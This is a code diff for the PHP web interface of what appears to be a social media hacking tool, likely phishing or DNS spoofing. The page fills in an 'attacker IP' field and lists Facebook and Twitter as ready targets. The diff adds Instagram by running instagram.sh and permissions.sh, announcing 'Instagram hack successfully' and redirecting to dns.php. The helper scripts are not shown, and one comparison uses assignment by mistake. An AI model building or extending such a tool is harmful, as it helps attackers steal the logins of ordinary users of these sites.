@@ -122,12 +122,18 @@ $(document).ready(function(){
   
   <br><br>
 
+
   <div align="center">
  <form action="" method="post" id="form1">
   <!--  <font color="black"> <h2> Hack http web sites </h2> </font> -->
   
   <font color="black">  < </font>
-     <input type="text" name="ip_addr" id="ip" minlength="7" maxlength="15" placeholder="Ip address of attacker"  autofocus required> 
+
+     <input type="text" name="ip_addr" id="ip" minlength="7" maxlength="15" 
+  placeholder="<?php echo 'Ip address of attacker'; ?>" 
+  value="<?php $attacker_ip = shell_exec('shell/./my_ipv4.sh'); sleep(2); echo $attacker_ip; ?>" 
+readonly required> 
+
       <font color="black"> > </font>
       <br><br>
       <font color="black"> < </font> 
@@ -156,6 +162,7 @@ $(document).ready(function(){
     <option selected disabled> Ready websites </option>
      <optgroup label="Social Media">
     <option value ="https://www.facebook.com"> Facebook </option>
+    <option value ="https://www.instagram.com"> Instagram </option>
     <option value ="https://www.twitter.com"> Twitter </option>
       </optgroup>
 
@@ -216,7 +223,7 @@ $(document).ready(function(){
    if (filter_var($ip_addr, FILTER_VALIDATE_IP) == true) 
        {
 
-    $get_ip = shell_exec('./my_ipv4.sh');
+    $get_ip = shell_exec('shell/./my_ipv4.sh');
  
      if ($get_ip = $ip_addr)
        {
@@ -339,6 +346,22 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
     } // end if of facebook
 
+
+
+   else if ($site_ready=='https://www.instagram.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./instagram.sh');
+
+
+
+    echo '<script type="text/javascript">alert("Instagram hack successfully");
+      </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of instagram
 
 
 
